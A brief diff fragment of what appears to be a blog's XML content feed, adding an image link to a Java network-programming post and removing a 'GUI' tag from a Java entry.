+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
 ]]></content>
       <categories>
         <category>编程语言</category>
@@ -796,7 +797,6 @@
       </categories>
       <tags>
         <tag>Java</tag>
-        <tag>GUI</tag>
       </tags>
   </entry>
   <entry>
